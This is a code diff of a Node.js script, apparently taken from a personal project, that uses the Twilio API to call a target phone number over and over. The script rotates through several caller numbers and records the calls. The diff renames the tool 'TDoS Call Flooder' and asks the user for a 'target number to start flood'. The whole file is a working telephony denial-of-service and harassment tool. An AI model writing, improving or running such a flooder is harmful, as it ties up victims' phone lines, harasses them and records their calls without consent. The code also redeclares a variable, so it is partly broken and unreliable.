@@ -1,20 +1,24 @@
 /*
-Misanya Liu
+Misanya Liui started this code
 7/12/17
-I've stared this code!
+Ethan Wessel continuing for own personal project
+10/24/2017
 */
-let accountSid = '*************';//Config Here
-let authToken = '**************';//Config Here
+
+let accountSid = process.env.TWILIO_ACCOUNT_SID; //Config Here
+let authToken = process.env.TWILIO_AUTH_TOKEN; //Config Here
+let numbers = process.env.TWILIO_NUMBERS; //Config Here
+let twimlUrl = process.env.TWILIO_TWIML; //Config Here
 let client = require('twilio')(accountSid, authToken);
 let readline = require('readline');
 
-let numbers = ['+10000000000','+10000000000','+10000000000','+10000000000'];//Config Here
+let numbers = [numbers];
 let toNumber = '+86**********';
 let count = 1;
 
 const calltimeout = 3000;// call time out = 3s.
 
-const appName ='===SOUP===';
+const appName ='===TDoS Call Flooder===';
 const rl = readline.createInterface({
     input: process.stdin,
     output: process.stdout
@@ -23,14 +27,16 @@ const rl = readline.createInterface({
 let index = 0;
 const callPhone = ()=>{
     client.calls.create({
-        url: "http://demo.twilio.com/docs/voice.xml",// add your own TwiML file path here.
+        url: twimlUrl,
         to: toNumber,
-        from: numbers[index++]
+        from: numbers[index++],
+	record: true 
     }, function(err, call) {
         if(call){
-            console.log(call.sid);
-        }
-        console.log(err);
+            console.log("SID: " + call.sid);
+        } else{
+            console.log("ERROR: " + err);
+	}
     });
 
     if(index >= numbers.length){
@@ -45,14 +51,13 @@ const launchCall = ()=>{
 
 // Entrance of Main
 console.log(appName);
-rl.question('Enter the target numbe to start flood(+1 MUST BE IN FRONT!):',(answer)=>{
+rl.question('Enter the target number to start flood(+1 MUST BE IN FRONT!):',(answer)=>{
     console.log(`Trying to call this number: ${answer}`);
     toNumber = answer;
 
     rl.close();
 
     launchCall();
+    //callPhone();
 });
-
-
-   
+  
